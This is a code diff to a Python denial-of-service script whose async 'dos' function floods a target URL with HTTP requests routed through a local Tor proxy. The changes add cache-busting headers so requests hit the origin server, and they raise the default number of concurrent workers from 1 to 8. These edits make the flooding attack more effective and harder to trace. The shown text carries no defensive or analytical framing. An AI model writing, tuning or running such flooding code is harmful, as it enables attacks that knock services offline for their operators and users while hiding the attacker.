@@ -15,6 +15,9 @@ import argparse
 import re
 
 
+__all__ = ['URL', 'PROXY_HOST', 'PROXY_PORT', 'WORKERS', 'dos', 'runner', 'pool']
+
+
 PROTOCOL_PATTERN = '^(?:https?:\/\/)?(?:www\.)?'
 
 URL = 'https://ident.me'
@@ -22,6 +25,8 @@ URL = 'https://ident.me'
 PROXY_HOST = 'localhost'
 
 PROXY_PORT = 9050
+
+WORKERS = 8
 
 
 async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
@@ -41,6 +46,9 @@ async def dos(url: str, proxy_host: str, proxy_port: str, worker: int):
         headers = {
             'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
             'Connection:': 'keep-alive',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'Expires': '0'
         }
 
         async with session.get(url, headers=headers) as response:
@@ -96,7 +104,7 @@ if __name__ == '__main__':
 
     parser.add_argument(
         '--workers',
-        default=1,
+        default=WORKERS,
         type=int
     )
 
